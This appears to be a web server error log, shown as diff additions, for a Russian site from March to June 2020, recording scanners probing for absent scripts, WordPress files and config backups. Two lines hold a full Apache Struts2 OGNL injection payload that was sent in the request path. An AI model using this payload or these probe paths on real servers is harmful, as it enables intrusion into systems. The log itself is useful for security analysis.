+[Wed Mar 18 14:00:09.766821 2020] [php7:error] [pid 18257] [client 5.188.210.101:13116] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Mar 18 23:18:29.287182 2020] [php7:error] [pid 18255] [client 149.129.50.37:39580] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Thu Mar 19 15:11:29.844757 2020] [php7:error] [pid 14066] [client 129.28.113.46:59350] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Mar 19 19:13:56.117848 2020] [php7:error] [pid 8946] [client 127.0.0.1:57810] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat Mar 21 18:57:44.017350 2020] [php7:error] [pid 11325] [client 158.108.44.242:56384] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat Mar 21 20:17:44.807429 2020] [php7:error] [pid 11327] [client 51.83.216.217:53740] script '/var/www/banks.obzorzarplat.ru/docs/public/check_proxy.php' not found or unable to stat
+[Sat Mar 21 20:17:47.926020 2020] [php7:error] [pid 11328] [client 51.83.216.217:47320] script '/var/www/banks.obzorzarplat.ru/docs/public/check_proxy.php' not found or unable to stat
+[Sun Mar 22 01:50:14.781600 2020] [php7:error] [pid 24970] [client 58.69.162.154:8935] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Mar 24 05:14:58.379618 2020] [php7:error] [pid 18387] [client 175.6.228.219:49098] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Mar 25 04:57:16.071328 2020] [php7:error] [pid 16892] [client 182.61.3.8:33762] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Mar 25 10:24:31.256128 2020] [php7:error] [pid 18172] [client 5.188.210.101:46194] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Mar 28 02:05:47.737835 2020] [php7:error] [pid 26556] [client 127.0.0.1:36654] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sun Mar 29 09:23:17.604530 2020] [php7:error] [pid 3530] [client 122.224.131.186:40716] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Mar 29 09:35:33.085662 2020] [php7:error] [pid 32745] [client 111.229.133.254:36546] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Mar 29 21:13:17.064971 2020] [php7:error] [pid 32746] [client 127.0.0.1:43476] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Wed Apr 01 17:52:38.283880 2020] [php7:error] [pid 20241] [client 5.188.210.101:18583] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Apr 01 18:32:13.753979 2020] [php7:error] [pid 27638] [client 220.175.6.110:2983] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Apr 02 03:49:24.774044 2020] [php7:error] [pid 20180] [client 182.180.113.54:59532] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Apr 02 17:44:20.539875 2020] [php7:error] [pid 3791] [client 127.0.0.1:50498] script '/var/www/banks.obzorzarplat.ru/docs/public/commands.inc.php' not found or unable to stat
+[Thu Apr 02 17:44:21.694787 2020] [php7:error] [pid 3790] [client 127.0.0.1:50502] script '/var/www/banks.obzorzarplat.ru/docs/public/dashboard.php' not found or unable to stat
+[Thu Apr 02 17:44:22.637881 2020] [php7:error] [pid 3792] [client 127.0.0.1:50506] script '/var/www/banks.obzorzarplat.ru/docs/public/commands.inc.php' not found or unable to stat
+[Fri Apr 03 02:50:13.444742 2020] [core:error] [pid 3955] (36)File name too long: [client 139.9.129.225:56190] AH00036: access to /%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('eresult','struts2_security_check'))}/index.action failed (filesystem path '/var/www/banks.obzorzarplat.ru/docs/public/%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('eresult','struts2_security_check'))}')
+[Fri Apr 03 02:50:17.937928 2020] [core:error] [pid 3792] (36)File name too long: [client 139.9.129.225:56501] AH00036: access to /%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('eresult','struts2_security_check'))}/index.action failed (filesystem path '/var/www/banks.obzorzarplat.ru/docs/public/%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('eresult','struts2_security_check'))}')
+[Fri Apr 03 16:12:48.760358 2020] [php7:error] [pid 26888] [client 213.136.69.132:47014] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Apr 03 23:24:03.382404 2020] [php7:error] [pid 26888] [client 202.102.90.226:59126] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Apr 04 00:32:32.227977 2020] [php7:error] [pid 26888] [client 62.234.6.68:50108] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Apr 04 06:06:18.662779 2020] [php7:error] [pid 4993] [client 195.250.70.203:5296] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Wed Apr 08 01:55:52.220359 2020] [php7:error] [pid 4565] [client 128.199.220.227:56552] script '/var/www/banks.obzorzarplat.ru/docs/public/api.php' not found or unable to stat
+[Wed Apr 08 01:55:52.631764 2020] [php7:error] [pid 13120] [client 128.199.220.227:56630] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Wed Apr 08 01:55:53.042713 2020] [php7:error] [pid 4655] [client 128.199.220.227:56732] script '/var/www/banks.obzorzarplat.ru/docs/public/system_api.php' not found or unable to stat
+[Wed Apr 08 09:33:39.259812 2020] [php7:error] [pid 28969] [client 5.188.210.101:44140] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Apr 08 11:51:09.338203 2020] [php7:error] [pid 28967] [client 49.233.150.196:57786] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Apr 09 03:35:01.485933 2020] [php7:error] [pid 32754] [client 134.175.122.59:44488] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Apr 10 06:35:32.230721 2020] [php7:error] [pid 8684] [client 127.0.0.1:58674] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Fri Apr 10 17:56:55.533667 2020] [php7:error] [pid 18514] [client 114.116.67.171:50876] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Apr 11 11:56:21.557414 2020] [php7:error] [pid 28065] [client 218.28.218.109:57831] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Apr 12 11:22:49.892186 2020] [php7:error] [pid 23571] [client 114.116.67.171:35440] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Apr 16 00:34:30.792029 2020] [php7:error] [pid 13943] [client 130.61.127.253:56986] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Apr 16 02:27:36.696035 2020] [php7:error] [pid 32331] [client 5.188.210.101:39152] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Thu Apr 16 17:35:22.661015 2020] [php7:error] [pid 8570] [client 140.143.56.153:37990] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Apr 17 00:37:47.183408 2020] [php7:error] [pid 31016] [client 127.0.0.1:54400] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Fri Apr 17 07:56:25.053268 2020] [php7:error] [pid 20799] [client 127.0.0.1:56306] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Sat Apr 18 06:57:39.312075 2020] [php7:error] [pid 10081] [client 127.0.0.1:40848] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat Apr 18 09:42:07.559138 2020] [php7:error] [pid 12148] [client 127.0.0.1:42220] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat Apr 18 20:57:38.524478 2020] [php7:error] [pid 10079] [client 58.213.107.106:4915] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Apr 19 10:29:53.987580 2020] [php7:error] [pid 31584] [client 202.107.188.12:51912] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Apr 20 12:55:24.139702 2020] [php7:error] [pid 20934] [client 218.201.82.168:46050] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Apr 21 06:50:57.750180 2020] [php7:error] [pid 2481] [client 127.0.0.1:51008] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Tue Apr 21 10:33:26.087462 2020] [php7:error] [pid 2360] [client 212.72.133.26:52303] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Apr 22 20:08:19.052389 2020] [php7:error] [pid 28164] [client 5.188.210.101:24933] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Thu Apr 23 00:39:17.626444 2020] [php7:error] [pid 23951] [client 193.28.177.235:53289] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Thu Apr 23 02:31:19.178078 2020] [php7:error] [pid 23950] [client 123.206.13.46:52810] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Apr 23 18:19:46.723427 2020] [php7:error] [pid 8755] [client 127.0.0.1:57392] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Fri Apr 24 03:10:40.392345 2020] [php7:error] [pid 21431] [client 202.107.188.11:38390] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Apr 24 09:35:17.448781 2020] [php7:error] [pid 24825] [client 211.91.56.118:43540] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Apr 25 06:03:27.992684 2020] [php7:error] [pid 24826] [client 118.25.79.208:57696] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Apr 25 12:03:03.731314 2020] [php7:error] [pid 11063] [client 127.0.0.1:52090] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: https://195.24.65.109/
+[Sun Apr 26 04:07:47.095889 2020] [php7:error] [pid 11061] [client 127.0.0.1:39518] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sun Apr 26 08:54:09.866211 2020] [php7:error] [pid 4328] [client 127.0.0.1:41052] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Sun Apr 26 16:11:57.708244 2020] [php7:error] [pid 16592] [client 119.84.70.215:50232] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Apr 27 09:04:52.598442 2020] [php7:error] [pid 1468] [client 95.163.251.120:48270] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Apr 27 12:48:54.342893 2020] [php7:error] [pid 31393] [client 127.0.0.1:45962] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Tue Apr 28 08:07:39.140746 2020] [php7:error] [pid 27309] [client 221.13.17.29:40044] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Apr 28 17:36:11.932997 2020] [php7:error] [pid 25865] [client 127.0.0.1:37292] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Wed Apr 29 05:57:25.375164 2020] [php7:error] [pid 25864] [client 127.0.0.1:59316] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Thu Apr 30 08:46:42.944436 2020] [php7:error] [pid 18804] [client 5.188.210.101:28828] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Fri May 01 01:35:33.983914 2020] [php7:error] [pid 5054] [client 121.201.34.11:52803] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat May 02 15:00:56.824397 2020] [php7:error] [pid 31530] [client 91.219.57.170:50285] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sun May 03 13:08:01.519519 2020] [php7:error] [pid 14856] [client 217.106.238.30:53195] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Mon May 04 01:32:22.076073 2020] [php7:error] [pid 26274] [client 139.199.16.213:47004] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon May 04 17:12:58.800399 2020] [php7:error] [pid 30173] [client 127.0.0.1:44758] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Mon May 04 19:37:19.085553 2020] [php7:error] [pid 30170] [client 149.129.50.37:48391] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Mon May 04 19:50:41.154707 2020] [php7:error] [pid 8345] [client 140.143.26.161:44114] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue May 05 00:48:04.128584 2020] [php7:error] [pid 30171] [client 127.0.0.1:47876] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://bank.obzorzarplat.ru/wp-login.php
+[Thu May 07 02:07:26.891323 2020] [php7:error] [pid 10239] [client 5.188.210.101:14878] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Fri May 08 07:10:31.297615 2020] [php7:error] [pid 22404] [client 203.154.59.166:37066] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri May 08 07:25:48.842715 2020] [php7:error] [pid 21496] [client 114.215.254.34:59066] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri May 08 17:37:18.672959 2020] [php7:error] [pid 21495] [client 58.144.208.115:47378] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat May 09 01:07:43.771037 2020] [php7:error] [pid 21497] [client 127.0.0.1:45080] script '/var/www/banks.obzorzarplat.ru/docs/public/orders.php' not found or unable to stat
+[Sat May 09 14:20:33.088774 2020] [php7:error] [pid 13754] [client 49.235.155.234:33544] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun May 10 07:32:56.836697 2020] [php7:error] [pid 9978] [client 122.51.191.168:54736] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon May 11 15:49:57.797885 2020] [php7:error] [pid 15866] [client 127.0.0.1:54310] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://bank.obzorzarplat.ru/wp-login.php
+[Wed May 13 14:12:04.115854 2020] [php7:error] [pid 12619] [client 121.43.235.134:56585] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed May 13 18:22:21.194065 2020] [php7:error] [pid 12619] [client 94.191.113.28:59664] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri May 15 05:24:05.560923 2020] [php7:error] [pid 11140] [client 127.0.0.1:58708] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Sat May 16 11:30:39.359785 2020] [php7:error] [pid 16010] [client 127.0.0.1:46566] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat May 16 16:08:42.347444 2020] [php7:error] [pid 16009] [client 192.119.91.48:50910] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat May 16 16:58:14.646001 2020] [php7:error] [pid 28886] [client 89.248.174.151:60620] script '/var/www/banks.obzorzarplat.ru/docs/public/setup.php' not found or unable to stat
+[Tue May 19 09:36:31.309368 2020] [php7:error] [pid 31222] [client 34.91.141.67:37218] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue May 19 22:32:47.539939 2020] [php7:error] [pid 27133] [client 94.180.250.158:35886] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue May 19 22:48:26.246305 2020] [php7:error] [pid 27131] [client 127.0.0.1:42668] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Wed May 20 04:40:28.506125 2020] [php7:error] [pid 31224] [client 127.0.0.1:46048] script '/var/www/banks.obzorzarplat.ru/docs/public/admin.php' not found or unable to stat
+[Fri May 22 11:22:23.418118 2020] [php7:error] [pid 32716] [client 83.143.86.62:44144] script '/var/www/banks.obzorzarplat.ru/docs/public/admin.php' not found or unable to stat
+[Fri May 22 20:13:14.572674 2020] [php7:error] [pid 32712] [client 123.56.18.205:41164] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat May 23 01:56:27.527480 2020] [php7:error] [pid 11920] [client 127.0.0.1:57976] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Tue May 26 07:45:11.701669 2020] [php7:error] [pid 5494] [client 127.0.0.1:39038] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Wed May 27 06:40:23.417692 2020] [php7:error] [pid 28605] [client 127.0.0.1:49876] script '/var/www/banks.obzorzarplat.ru/docs/public/system_api.php' not found or unable to stat
+[Wed May 27 06:40:24.895485 2020] [php7:error] [pid 28606] [client 127.0.0.1:49882] script '/var/www/banks.obzorzarplat.ru/docs/public/api.php' not found or unable to stat
+[Wed May 27 06:40:25.373922 2020] [php7:error] [pid 28602] [client 127.0.0.1:49884] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Thu May 28 08:14:47.224928 2020] [php7:error] [pid 30182] [client 129.204.201.59:37392] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri May 29 17:38:39.568608 2020] [php7:error] [pid 19214] [client 127.0.0.1:53382] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Fri May 29 19:53:16.294541 2020] [php7:error] [pid 19218] [client 62.234.218.151:45212] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 01 10:11:17.277066 2020] [php7:error] [pid 21783] [client 101.206.210.27:60182] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 01 22:47:03.033972 2020] [php7:error] [pid 18664] [client 180.97.215.22:64631] script '/var/www/banks.obzorzarplat.ru/docs/public/spread.php' not found or unable to stat
+[Mon Jun 01 22:47:03.296219 2020] [php7:error] [pid 18664] [client 180.97.215.22:64631] script '/var/www/banks.obzorzarplat.ru/docs/public/spread.php' not found or unable to stat
+[Mon Jun 01 22:47:04.620278 2020] [php7:error] [pid 18664] [client 180.97.215.22:64631] script '/var/www/banks.obzorzarplat.ru/docs/public/spread.php' not found or unable to stat
+[Mon Jun 01 22:47:04.880890 2020] [php7:error] [pid 18664] [client 180.97.215.22:64631] script '/var/www/banks.obzorzarplat.ru/docs/public/spread.php' not found or unable to stat
+[Tue Jun 02 09:29:51.614381 2020] [php7:error] [pid 10748] [client 127.0.0.1:46810] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Tue Jun 02 13:02:19.515963 2020] [php7:error] [pid 16575] [client 34.91.141.67:46492] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 02 20:22:01.624921 2020] [php7:error] [pid 10748] [client 220.170.143.137:31900] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 03 17:06:04.392818 2020] [php7:error] [pid 32750] [client 127.0.0.1:60908] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Wed Jun 03 17:27:53.499761 2020] [php7:error] [pid 32750] [client 220.170.143.137:30423] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jun 04 09:15:53.947256 2020] [php7:error] [pid 26288] [client 127.0.0.1:43604] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Thu Jun 04 12:07:15.440646 2020] [php7:error] [pid 26288] [client 127.0.0.1:45472] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat
+[Sat Jun 06 04:25:01.651731 2020] [php7:error] [pid 16803] [client 127.0.0.1:40158] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Sat Jun 06 05:27:56.528361 2020] [php7:error] [pid 16803] [client 127.0.0.1:40542] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat Jun 06 23:06:20.224808 2020] [php7:error] [pid 22901] [client 220.170.143.137:37329] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 08 07:03:02.053201 2020] [php7:error] [pid 23176] [client 127.0.0.1:38254] script '/var/www/banks.obzorzarplat.ru/docs/public/config.php.swp' not found or unable to stat
+[Mon Jun 08 07:03:04.673577 2020] [php7:error] [pid 22828] [client 127.0.0.1:38264] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-config.php' not found or unable to stat
+[Mon Jun 08 07:03:06.555954 2020] [php7:error] [pid 23176] [client 127.0.0.1:38268] script '/var/www/banks.obzorzarplat.ru/docs/public/.wp-config.php.swp' not found or unable to stat
+[Mon Jun 08 09:15:03.608266 2020] [php7:error] [pid 25199] [client 124.89.91.203:46303] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 09 03:55:48.680611 2020] [php7:error] [pid 25199] [client 130.61.153.248:43456] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 10 01:31:27.959944 2020] [php7:error] [pid 8341] [client 127.0.0.1:34036] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Wed Jun 10 08:26:58.943457 2020] [php7:error] [pid 4743] [client 106.12.47.131:48302] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 10 10:55:31.687495 2020] [php7:error] [pid 4743] [client 129.158.122.65:30189] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 10 17:35:09.349652 2020] [php7:error] [pid 6905] [client 46.213.149.17:6246] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Wed Jun 10 22:18:59.189774 2020] [php7:error] [pid 6906] [client 5.188.210.101:20405] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Fri Jun 12 00:08:28.486894 2020] [php7:error] [pid 27523] [client 120.24.74.208:41336] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Jun 13 03:43:29.895043 2020] [php7:error] [pid 8729] [client 176.120.28.179:49028] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sun Jun 14 01:25:13.608386 2020] [php7:error] [pid 1358] [client 127.0.0.1:56678] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Mon Jun 15 01:04:32.555740 2020] [php7:error] [pid 19153] [client 188.131.246.128:52378] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 17 12:51:45.104071 2020] [php7:error] [pid 24074] [client 129.204.121.3:33734] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 17 14:00:51.825150 2020] [php7:error] [pid 18152] [client 5.188.210.101:16065] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Jun 17 15:31:57.224004 2020] [php7:error] [pid 24075] [client 156.96.155.242:2528] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Thu Jun 18 03:20:52.052498 2020] [php7:error] [pid 18153] [client 127.0.0.1:48988] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Thu Jun 18 21:13:57.408047 2020] [php7:error] [pid 7193] [client 217.106.238.30:35680] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Fri Jun 19 20:53:48.806382 2020] [php7:error] [pid 27367] [client 182.254.179.56:45054] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 22 05:04:59.970759 2020] [php7:error] [pid 9953] [client 127.0.0.1:39410] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Mon Jun 22 05:58:07.083037 2020] [php7:error] [pid 9961] [client 106.13.222.241:55800] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 22 23:54:21.530991 2020] [php7:error] [pid 16609] [client 89.252.181.114:59964] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 24 05:21:03.758511 2020] [php7:error] [pid 24606] [client 195.176.3.23:57254] script '/var/www/banks.obzorzarplat.ru/docs/public/config.php.swp' not found or unable to stat
+[Wed Jun 24 05:21:05.638234 2020] [php7:error] [pid 15536] [client 185.232.52.100:44548] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-config.php' not found or unable to stat
+[Wed Jun 24 05:21:07.118130 2020] [php7:error] [pid 15523] [client 95.216.145.1:49860] script '/var/www/banks.obzorzarplat.ru/docs/public/.wp-config.php.swp' not found or unable to stat
+[Thu Jun 25 01:59:11.599956 2020] [php7:error] [pid 17212] [client 5.188.210.101:61273] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Fri Jun 26 03:32:38.605905 2020] [php7:error] [pid 20040] [client 176.120.28.179:42640] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Fri Jun 26 09:17:28.068037 2020] [php7:error] [pid 14244] [client 127.0.0.1:43394] script '/var/www/banks.obzorzarplat.ru/docs/public/data.php' not found or unable to stat
+[Fri Jun 26 15:50:44.676678 2020] [php7:error] [pid 14245] [client 127.0.0.1:48046] script '/var/www/banks.obzorzarplat.ru/docs/public/config.php.swp' not found or unable to stat
+[Fri Jun 26 15:50:49.441947 2020] [php7:error] [pid 14243] [client 127.0.0.1:48052] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-config.php' not found or unable to stat
+[Fri Jun 26 19:43:51.951792 2020] [php7:error] [pid 14245] [client 117.50.137.36:19035] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Jun 28 10:32:26.669607 2020] [php7:error] [pid 1832] [client 175.24.91.184:52950] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
